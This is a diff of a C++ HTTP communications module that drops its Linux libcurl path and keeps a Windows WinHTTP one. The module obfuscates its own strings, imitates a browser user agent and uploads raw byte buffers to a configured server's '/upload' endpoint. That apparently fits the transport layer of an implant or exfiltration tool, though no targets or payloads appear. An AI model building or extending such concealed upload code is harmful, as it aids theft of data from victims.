@@ -9,34 +9,23 @@
 #include <random>
 #include <cstdint>
 #include <string>
-
-#if PLATFORM_WINDOWS
+#include <windows.h>
 #include <winhttp.h>
+
 #pragma comment(lib, "winhttp.lib")
-#else
-#include <curl/curl.h>
-#endif
 
 // Obfuscated strings
 static const auto OBF_HTTP_COMMS = OBFUSCATE("HttpComms");
 static const auto OBF_USER_AGENT = OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
 
 HttpComms::HttpComms(Configuration* config)
-    : m_config(config)
-    #if PLATFORM_WINDOWS
-    , m_hSession(NULL), m_hConnect(NULL)
-    #else
-    , m_hSession(nullptr), m_hConnect(nullptr)
-    #endif
-{}
+    : m_config(config), m_hSession(NULL), m_hConnect(NULL) {}
 
 HttpComms::~HttpComms() {
     Cleanup();
 }
 
 bool HttpComms::Initialize() {
-    #if PLATFORM_WINDOWS
-    // Windows implementation với WinHTTP
     std::wstring userAgent = std::wstring(OBF_USER_AGENT.begin(), OBF_USER_AGENT.end());
     
     DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
@@ -106,18 +95,9 @@ bool HttpComms::Initialize() {
 
     LOG_INFO("HTTP communication initialized successfully");
     return true;
-    
-    #else
-    // Linux implementation - libcurl initialization nếu cần
-    // Thông thường libcurl không cần explicit initialization
-    LOG_INFO("HTTP communication initialized (using libcurl)");
-    return true;
-    #endif
 }
 
 bool HttpComms::SendData(const std::vector<uint8_t>& data) {
-    #if PLATFORM_WINDOWS
-    // Windows implementation với WinHTTP
     if (!m_hConnect) {
         LOG_ERROR("HTTP connection not initialized");
         return false;
@@ -195,53 +175,9 @@ bool HttpComms::SendData(const std::vector<uint8_t>& data) {
 
     WinHttpCloseHandle(hRequest);
     return success;
-    
-    #else
-    // Linux implementation với libcurl
-    CURL* curl = curl_easy_init();
-    if (!curl) {
-        LOG_ERROR("Failed to initialize libcurl");
-        return false;
-    }
-
-    std::string url = m_config->GetServerUrl() + "/upload";
-    
-    // Set up curl options
-    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-    curl_easy_setopt(curl, CURLOPT_POST, 1L);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.data());
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.size());
-    
-    // Set headers
-    struct curl_slist* headers = NULL;
-    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
-    std::string requestId = "X-Request-ID: " + utils::StringUtils::GenerateRandomString(16);
-    headers = curl_slist_append(headers, requestId.c_str());
-    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-    
-    // Set timeout
-    int timeout = m_config->GetTimeout();
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, timeout);
-    
-    // Perform request
-    CURLcode res = curl_easy_perform(curl);
-    
-    // Clean up
-    curl_slist_free_all(headers);
-    curl_easy_cleanup(curl);
-    
-    if (res != CURLE_OK) {
-        LOG_ERROR("HTTP request failed: " + std::string(curl_easy_strerror(res)));
-        return false;
-    }
-    
-    LOG_DEBUG("HTTP request sent successfully");
-    return true;
-    #endif
 }
 
 void HttpComms::Cleanup() {
-    #if PLATFORM_WINDOWS
     if (m_hConnect) {
         WinHttpCloseHandle(m_hConnect);
         m_hConnect = NULL;
@@ -250,11 +186,6 @@ void HttpComms::Cleanup() {
         WinHttpCloseHandle(m_hSession);
         m_hSession = NULL;
     }
-    #else
-    // Cleanup for Linux - libcurl tự quản lý resource
-    m_hConnect = nullptr;
-    m_hSession = nullptr;
-    #endif
     
     LOG_DEBUG("HTTP communication cleaned up");
 }   
@@ -265,10 +196,5 @@ bool HttpComms::TestConnection() const {
 
 std::vector<uint8_t> HttpComms::ReceiveData() {
     // Implement HTTP data reception if needed
-    #if PLATFORM_WINDOWS
-    // Windows implementation
-    #else
-    // Linux implementation
-    #endif
     return std::vector<uint8_t>();
 }
